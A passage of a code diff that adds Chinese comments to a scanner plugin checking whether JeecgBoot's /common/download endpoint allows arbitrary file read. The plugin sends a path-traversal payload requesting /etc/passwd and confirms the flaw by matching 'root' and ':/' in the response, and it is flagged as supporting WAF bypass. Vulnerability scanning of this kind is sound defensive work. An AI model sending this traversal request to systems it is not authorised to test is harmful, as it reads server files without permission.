@@ -31,12 +31,21 @@ class JeecgFileReadDownloadPlugin(PluginBase):
     supports_waf_bypass = True
 
     def verify(self, target, session):
+        """检测 /common/download 接口是否存在任意文件读取。
+
+        @param target: 目标站点根 URL
+        @param session: 复用的 HTTP 会话
+        @return: ScanResult —— 命中 CONFIRMED；未命中 SAFE；网络异常 UNKNOWN
+        """
+        # 6 级 ../ 覆盖常见容器/应用部署层级；/etc/passwd 为 Linux 稳定存在、特征明确的文件
         url = join_url(target, "/jeecg-boot/common/download?fileName=../../../../../../etc/passwd")
         try:
             text = session.get(url).text or ""
         except Exception as e:
+            # 网络异常归 UNKNOWN：测不到 ≠ 安全，避免漏报
             print(no("JeecgBoot 任意文件读取（网络异常）"))
             return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
+        # 双特征判定：root 账户名 + passwd 行分隔符 ":/"，避免页面恰含 root 字样造成误报
         if match_all(text, ["root", ":/"]):
             print(ok("存在 JeecgBoot 任意文件读取"))
             return ScanResult(
